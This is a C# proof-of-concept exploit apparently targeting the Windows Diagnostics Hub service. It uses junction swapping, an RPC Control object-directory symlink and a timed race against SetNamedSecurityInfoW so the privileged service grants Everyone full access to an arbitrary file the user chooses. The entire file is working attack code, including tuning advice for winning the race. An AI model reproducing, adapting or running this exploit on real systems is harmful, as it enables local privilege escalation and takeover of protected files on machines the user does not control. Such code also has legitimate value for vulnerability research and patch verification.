using Monitor.Core.Utilities;
using NtApiDotNet;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace DiagHubSetNamedSecurityInfoTakeover
{
    class Program
    {
        const int numberOfFilesToWriteToGiveSetNamedSecurityInfoSomeWork = 1000;
        const int millisecondsToSleepForMetadataXmlBeingWritten = 50;

        class Etw
        {
            public const string Link  = "Etw"; // supplied to Diaghub

            public const string Legit = "etw"; // this is where the file operations should normally take place

            public const string Mali1 = "ETW"; // contains a Report dir junction to RPC Control object directory
        }

        private const string DaclAllowEveryOneSD = "D:(A;;GA;;;WD)(A;OICIIO;GA;;;WD)";

        static Process RunCommandDontWait(string filename, string arguments)
        {
            Console.Error.WriteLine($"Exeucuting command: {filename} {arguments}");
            System.Diagnostics.ProcessStartInfo procStartInfo = new System.Diagnostics.ProcessStartInfo(filename, arguments)
            {
                UseShellExecute = false,
            };
            return System.Diagnostics.Process.Start(procStartInfo);
        }
        static void RunCommand(string filename, string arguments)
        {
            using (var p = RunCommandDontWait(filename, arguments))
            {
                p.WaitForExit();
            }
        }

        static void CreateJunction(string junctionPath, string destinationPath, bool quickMode)
        {
            JunctionPoint.Create(junctionPath, destinationPath, quickMode);
        }

        static void Main(string[] args)
        {
            if ((args.Length > 3) || (args.Length < 2))
            {
                Console.Error.WriteLine("Usage: DiagHubSetNamedSecurityInfoTakeover path-to-a-dir-for-scratch path-to-file-to-take-over [delay_ms]");
                Console.Error.WriteLine();
                Console.Error.WriteLine("Context:");
                Console.Error.WriteLine("There is a race condition to win. The operations and their order in DiagHub:");
                Console.Error.WriteLine("1) lock file created");
                Console.Error.WriteLine("2) metadata.xml file created");
                Console.Error.WriteLine("3) SetNamedSecurityInfoW is called on the directory");
                Console.Error.WriteLine();
                Console.Error.WriteLine("Successful exploitation needs a junction point to be replaced between 2 and 3.");
                Console.Error.WriteLine("If we are too fast, the service won't be able to create metadata.xml (and will throw)");
                Console.Error.WriteLine("If we are too slow, SetNamedSecurityInfoW is invoked on the legit target.");
                Console.Error.WriteLine();
                Console.Error.WriteLine("This tool monitors the presence of the lock file. Once it shows up, it sleeps a little (3rd parameter)");
                Console.Error.WriteLine("then it replaces the junction point. Suggestion: start with zero delay (which is also the default).");
                Console.Error.WriteLine("If you see an exception, it means the delay should be increased a bit (recommendation: 10ms)");
                Console.Error.WriteLine("If you don't encounter an exception, but the permissions of the destination file are still the original");
                Console.Error.WriteLine("you need to decrease the delay.");
                Console.Error.WriteLine();
                Console.Error.WriteLine("While this might sound complicated, my experience is that no delay usually works, as SetNamedSecurityInfoW");
                Console.Error.WriteLine("is invoked even when the metadata.xml file couldn't be created.");
                return;
            }

            var rootDir = Path.GetFullPath(args[0]);
            var fileToTakeOver = Path.GetFullPath(args[1]);
            var delay = args.Length == 3 ? int.Parse(args[2]) : 0;

            var baseDir = Path.Combine(rootDir, "diaghub-acl-takeover-poc");
            var baseDirNt = NtFileUtils.DosFileNameToNt(baseDir);

            Directory.CreateDirectory(baseDir);

            using (var ntFile = NtFile.Open(baseDirNt, null, FileAccessRights.MaximumAllowed, FileShareMode.All, FileOpenOptions.DirectoryFile))
            {
                SecurityDescriptor sddl = new SecurityDescriptor(DaclAllowEveryOneSD);
                ntFile.SetSecurityDescriptor(sddl, SecurityInformation.Dacl);
                try
                {
                    ntFile.CaseSensitive = true;
                }
                catch (Exception e)
                {
                    Console.Error.WriteLine($@"Unable to flag {baseDir} as case-sensitive. Make sure NtfsEnableDirCaseSensitivity DWORD at HKLM\SYSTEM\CurrentControlSet\Control\FileSystem is set to 1");
                    Console.Error.WriteLine(e.Message);
                    return;
                }

                Console.Error.WriteLine($"Case sensitive dir created successfully {baseDir}");
            }



            var LegitDir = Path.Combine(baseDir, Etw.Legit);
            Directory.CreateDirectory(LegitDir);
            var MaliDir = Path.Combine(baseDir, Etw.Mali1);
            // note: MaliDir is created by CreateSymlink below, it will be a junction dir to RPC Control object directory

            var LinkDir = Path.Combine(baseDir, Etw.Link);
            CreateJunction(LinkDir, LegitDir, false);

            var guid = Guid.NewGuid().ToString().ToUpper();
            var ReportDirName = $"Report.{guid}";
            var MaliDirReport = Path.Combine(MaliDir, ReportDirName);

            var symlinkProcess = RunCommandDontWait("CreateSymlink.exe", $"{MaliDirReport} \"{fileToTakeOver}\"");

            var LockLegitPath = Path.Combine(LegitDir, ReportDirName, "lock");

            Console.WriteLine($"Preparation succeeded, using report dir {ReportDirName}");

            RunCommand("VSDiagnostics.exe", $"start {guid} /loadAgent:e485d7a9-c21b-4903-892e-303c10906f6e;DiagnosticsHub.StandardCollector.Runtime.dll /scratchLocation:{LinkDir}");

            var t = new Thread(() =>
            {
                Thread.CurrentThread.IsBackground = true;

                Console.WriteLine($"Monitoring file to show up: {LockLegitPath}");
                DateTime before = DateTime.Now;
                int cycles = 0;

                while (true)
                {
                    if (File.Exists(LockLegitPath))
                        break;
                    cycles++;
                    if(cycles % 1000000 == 0)
                    {
                        DateTime after = DateTime.Now;
                        if((after-before).TotalSeconds > 5)
                        {
                            Console.Error.WriteLine("Nothing has happened for 5 seconds, probably something is wrong");
                            return;
                        }
                    }
                }

                if(delay > 0)
                {
                    Thread.Sleep(delay);
                }

                // pointing to the dir with many files
                CreateJunction(LinkDir, MaliDir, true);

                Console.WriteLine($"lock file has shown up, {LinkDir} replaced to {MaliDir}");
            });
            t.Start();

            // giving the thread and the symlink process some time to init
            Thread.Sleep(500);

            Console.WriteLine("Executing the report generation process");

            RunCommand("VSDiagnostics.exe", $"stop {guid} /output:-");

            t.Join();

            // removing the RPC Control symlink
            symlinkProcess.Kill();

            Console.WriteLine("Done! Run:");
            Console.WriteLine($"icacls {fileToTakeOver}");
        }
    }
}
